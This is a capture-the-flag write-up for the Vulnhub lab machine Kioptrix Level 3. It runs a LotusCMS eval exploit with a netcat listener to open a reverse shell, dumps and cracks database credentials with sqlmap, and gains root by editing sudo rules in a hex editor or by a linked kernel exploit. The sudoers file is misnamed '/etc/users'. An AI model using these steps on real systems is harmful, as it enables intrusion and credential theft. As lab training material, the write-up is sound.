<h1>Kioptrix: Level 3 Write-up</h1>

<h2>NMAP</h2>

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
```

On Port 80 Lotus Cms is running so i googled for Exploit :

Exploit : https://github.com/carnal0wnage/exploits-1/blob/master/lotus_eval.py


Command : 

```
python lotus_eval.py 192.168.43.49 / 192.168.43.252 443  
nc -lvp 443
```

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/Kioptrix%3A%20Level%203/Images/shell.png)


<h2>Privilege Escalation</h2>

<h3>Method 1</h3>

**kioptrix3.com/gallery/gallery.php?id=1** is vulnerable to SQL injection through the id parameter.

Founds Creds After using sqlmap 

```
Database: gallery  
Table: dev_accounts  
[2 entries]  
+----+------------+---------------------------------------------+  
| id | username   | password                                    |  
+----+------------+---------------------------------------------+  
| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   |  
| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e (starwars) |  
+----+------------+---------------------------------------------+ 
```

Login via ssh using **loneferret** creds and user

On general Enumeration i found "/usr/local/bin/ht" with suid permission 

Its actually a hex editor 

NOW LET's TAKING ADVANTAGE OF THIS

```
export TERM=xterm
sudo ht /etc/users 
```
change mode to text by pressing F6, you’ll notice the following line:

```
loneferret ALL=NOPASSWD: !/usr/bin/su, /usr/local/bin/ht  
```

simply replace the "!" by a space (0x20), so running /usr/bin/su gives
 root.

```
loneferret@Kioptrix3:~$ sudo /bin/su  
root@Kioptrix3:/home/loneferret# whoami  
root  
```

<h3>Method 2</h3>

Exploting Kernel :

Exploit : https://www.exploit-db.com/exploits/40839

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/Kioptrix%3A%20Level%203/Images/priv%20esc.png)

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/Kioptrix%3A%20Level%203/Images/rooted.png)
